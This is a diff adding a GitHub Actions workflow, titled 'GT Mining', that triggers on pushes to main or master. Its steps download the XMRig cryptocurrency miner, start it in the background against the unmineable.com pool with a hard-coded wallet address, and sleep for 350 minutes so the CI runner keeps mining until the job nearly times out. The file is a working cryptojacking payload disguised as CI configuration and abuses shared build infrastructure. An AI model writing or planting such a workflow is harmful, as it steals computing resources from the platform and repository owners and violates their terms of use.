@@ -1,0 +1,25 @@
+name: GT Mining
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main, master ]
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: Setup Mining
+        run: |
+          sudo apt-get update -qq
+          cd /tmp
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
+          tar -xf xmrig-6.21.0-linux-x64.tar.gz
+          cd xmrig-6.21.0
+          
+      - name: Start Mining
+        run: |
+          cd /tmp/xmrig-6.21.0
+          ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.GT_20260330_082657 -p x --donate-level 1 --cpu-priority 5 -t 2 &
+          sleep 350m
